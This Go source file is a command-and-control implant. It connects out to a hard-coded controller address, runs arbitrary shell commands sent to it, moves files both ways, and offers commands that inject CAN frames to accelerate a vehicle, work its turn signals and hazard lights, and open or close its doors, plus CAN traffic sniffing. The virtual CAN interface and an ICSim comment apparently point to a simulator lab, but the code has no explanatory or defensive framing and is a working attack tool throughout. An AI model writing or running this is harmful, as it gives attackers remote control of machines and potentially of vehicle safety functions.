package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

func main() {
	conn, err := net.Dial("tcp", "172.16.0.56:8080")
	if err != nil {
		log.Fatalf("Failed to connect to server: %v", err)
	}
	defer conn.Close()

	for {
		command, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			log.Printf("Failed to read command: %v", err)
			return
		}
		command = strings.TrimSpace(command)

		parts := strings.SplitN(command, " ", 2)
		switch parts[0] {
		case "upload":
			if len(parts) != 2 {
				log.Println("Upload command requires a remotepath")
				continue
			}
			remotePath := parts[1]
			uploadFile(conn, remotePath)
		case "download":
			if len(parts) != 2 {
				log.Println("Download command requires a remotepath")
				continue
			}
			remotePath := parts[1]
			downloadFile(conn, remotePath)
		case "osinfo":
			sendCompleteOutput(conn, runtime.GOOS)
		case "timezone":
			_, offset := time.Now().Zone()
			timezone := fmt.Sprintf("UTC%+d", offset/3600)
			sendCompleteOutput(conn, timezone)
		case "localtime":
			localTime := time.Now().Format(time.RFC1123)
			sendCompleteOutput(conn, localTime)
		case "sniff":
			runSniff(conn)
		case "accelerate":
			runAccelerate(conn)
		case "leftsignal":
			runLeftSignal(conn)
		case "rightsignal":
			runRightSignal(conn)
		case "hazard":
			runHazardSignal(conn)
		case "dooropen":
			runDoorOpen(conn)
		case "doorclose":
			runDoorClose(conn)

		default:
			output, err := executeCommand(command)
			if err != nil {
				output = fmt.Sprintf("Error executing command: %v", err)
			}
			sendCompleteOutput(conn, output)
		}
	}
}

func runAccelerate(conn net.Conn) {
	sendCompleteOutput(conn, "Finished Accelerating to max speed...")

	// Path to the ICSim binary and the command to send CAN messages
	startTime := time.Now()
	for time.Since(startTime) < 9*time.Second {
		cmd := exec.Command("cansend", "vcan0", "244#00000FFF")
		if err := cmd.Run(); err != nil {
			sendCompleteOutput(conn, fmt.Sprintf("Error accelerating: %v", err))
			return
		}
	}
}

func runLeftSignal(conn net.Conn) {
	sendCompleteOutput(conn, "Finished Indicating left...")

	// Command to send CAN messages for left signal
	startTime := time.Now()
	for time.Since(startTime) < 10*time.Second {
		cmd := exec.Command("cansend", "vcan0", "188#01")
		if err := cmd.Run(); err != nil {
			sendCompleteOutput(conn, fmt.Sprintf("Error indicating left: %v", err))
			return
		}
		time.Sleep(1 * time.Second) // Adjust the delay as needed
	}

}

func runRightSignal(conn net.Conn) {
	sendCompleteOutput(conn, "Finished Indicating Right...")

	// Command to send CAN messages for left signal
	startTime := time.Now()
	for time.Since(startTime) < 10*time.Second {
		cmd := exec.Command("cansend", "vcan0", "188#02")
		if err := cmd.Run(); err != nil {
			sendCompleteOutput(conn, fmt.Sprintf("Error indicating left: %v", err))
			return
		}
		time.Sleep(1 * time.Second) // Adjust the delay as needed
	}

}

func runHazardSignal(conn net.Conn) {
	sendCompleteOutput(conn, "Stopping Hazard Lights...")

	// Command to send CAN messages for left signal
	startTime := time.Now()
	for time.Since(startTime) < 10*time.Second {
		cmd := exec.Command("cansend", "vcan0", "188#03")
		if err := cmd.Run(); err != nil {
			sendCompleteOutput(conn, fmt.Sprintf("Error indicating left: %v", err))
			return
		}
		time.Sleep(1 * time.Second) // Adjust the delay as needed
	}

}

func runDoorOpen(conn net.Conn) {
	sendCompleteOutput(conn, "All doors opened...")

	// Command to send CAN messages for left signal
	startTime := time.Now()
	for time.Since(startTime) < 10*time.Second {
		cmd := exec.Command("cansend", "vcan0", "19B#000000")
		if err := cmd.Run(); err != nil {
			sendCompleteOutput(conn, fmt.Sprintf("Error indicating left: %v", err))
			return
		}
		time.Sleep(1 * time.Second) // Adjust the delay as needed
	}

}

func runDoorClose(conn net.Conn) {
	sendCompleteOutput(conn, "All doors closed...")

	// Command to send CAN messages for left signal
	startTime := time.Now()
	for time.Since(startTime) < 10*time.Second {
		cmd := exec.Command("cansend", "vcan0", "19B#00000F")
		if err := cmd.Run(); err != nil {
			sendCompleteOutput(conn, fmt.Sprintf("Error indicating left: %v", err))
			return
		}
		time.Sleep(1 * time.Second) // Adjust the delay as needed
	}

}

func runSniff(conn net.Conn) {
	absPath := "candump.log"
	cmd := exec.Command("candump", "vcan0", "-f", absPath)
	cmd.Dir, _ = os.Getwd() // Set the working directory to the current working directory

	// Create pipes to capture stdout and stderr
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		sendCompleteOutput(conn, fmt.Sprintf("Failed to get stdout pipe: %v", err))
		return
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		sendCompleteOutput(conn, fmt.Sprintf("Failed to get stderr pipe: %v", err))
		return
	}

	if err := cmd.Start(); err != nil {
		sendCompleteOutput(conn, fmt.Sprintf("Failed to start candump: %v", err))
		return
	}

	// Read from stdout and stderr in separate goroutines
	go func() {
		scanner := bufio.NewScanner(stdout)
		for scanner.Scan() {
			log.Printf("candump stdout: %s", scanner.Text())
		}
	}()
	go func() {
		scanner := bufio.NewScanner(stderr)
		for scanner.Scan() {
			log.Printf("candump stderr: %s", scanner.Text())
		}
	}()

	time.Sleep(15 * time.Second)


	if err := cmd.Process.Kill(); err != nil {
		sendCompleteOutput(conn, fmt.Sprintf("Failed to stop candump: %v", err))
		return
	}

	// Wait for the command to exit and capture any errors
	if err := cmd.Wait(); err != nil {
		sendCompleteOutput(conn, fmt.Sprintf("Sniffing Completed Successfully and Process Killed with %v", err))
		return
	}

	// Debugging: Check if the file exists after candump
	if _, err := os.Stat(absPath); os.IsNotExist(err) {
		sendCompleteOutput(conn, fmt.Sprintf("candump.log does not exist in %s", cmd.Dir))
		return
	}

	conn.Write([]byte("[+] candump.log file created\nEOF\n"))
}



func executeCommand(command string) (string, error) {
	cmd := exec.Command("sh", "-c", command)
	output, err := cmd.CombinedOutput()
	return string(output), err
}

func sendCompleteOutput(conn net.Conn, output string) {
	scanner := bufio.NewScanner(strings.NewReader(output))
	for scanner.Scan() {
		line := scanner.Text()
		conn.Write([]byte(line + "\n"))
	}
	conn.Write([]byte("EOF\n"))
}

func uploadFile(conn net.Conn, remotePath string) {
	// Create the full local path
	localDir := filepath.Dir(remotePath)
	if err := os.MkdirAll(localDir, 0755); err != nil {
		log.Printf("Failed to create directories: %v", err)
		return
	}

	file, err := os.Create(remotePath)
	if err != nil {
		log.Printf("Failed to create file: %v", err)
		return
	}
	defer file.Close()

	buf := make([]byte, 1024)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			if err == io.EOF {
				break
			}
			log.Printf("Failed to receive file: %v", err)
			return
		}

		content := string(buf[:n])
		if strings.Contains(content, "EOF\n") {
			content = strings.Replace(content, "EOF\n", "", 1)
			if len(content) > 0 {
				file.Write([]byte(content))
			}
			break
		}

		file.Write(buf[:n])
	}
}

func downloadFile(conn net.Conn, remotePath string) {
	file, err := os.Open(remotePath)
	if err != nil {
		log.Printf("Failed to open file: %v", err)
		conn.Write([]byte("ERR\n"))
		return
	}
	defer file.Close()

	buf := make([]byte, 1024)
	for {
		n, err := file.Read(buf)
		if err != nil && err != io.EOF {
			log.Printf("Failed to read file: %v", err)
			conn.Write([]byte("ERR\n"))
			return
		}
		if n == 0 {
			break
		}
		conn.Write(buf[:n])
	}

	conn.Write([]byte("EOF\n"))
}
